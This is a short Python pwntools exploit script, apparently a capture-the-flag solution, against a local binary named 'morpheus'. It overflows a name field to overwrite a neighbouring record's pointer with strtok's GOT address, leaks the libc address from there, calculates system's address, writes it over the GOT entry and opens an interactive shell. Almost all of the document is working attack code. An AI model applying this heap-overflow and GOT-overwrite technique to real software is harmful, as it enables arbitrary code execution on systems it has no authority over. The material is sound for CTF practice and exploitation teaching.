from pwn import *
r = process("./morpheus")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
def un64(data):
    return int(data[::-1].encode("hex"),16)


def changeName(p,idx):
    r.sendlineafter("Choice: ",str(1))
    r.sendlineafter("Select ID: ",str(idx))
    r.sendlineafter("Insert Name: ",p)


def main():
    strtok = 0x000000602078

    p = "A" * 40
    p += p64(0x0000000000000021)
    p += p64(strtok)
    p += p32(2000000000)
    p += p32(2000000000)


    r.sendlineafter("Choice: ",str(1))
    r.sendlineafter("Select ID: ",str(2))
    r.sendlineafter("Insert Name: ",p)
    r.recvuntil("| ID   : 3")
    r.recvuntil("| Name : ")
    leak = un64(r.recv(8).split()[0])

    log.info("leak strtok : " + hex(leak) )

    # kalkulasi
    libc_base = leak - libc.symbols['strtok']
    libc_system = libc_base + libc.symbols['system']


    r.sendlineafter("Choice: ","1")
    r.sendlineafter("Select ID: ","3")
    r.sendlineafter("Insert Name: ",p64(libc_system))



    r.interactive()

if __name__ == '__main__':
    main()
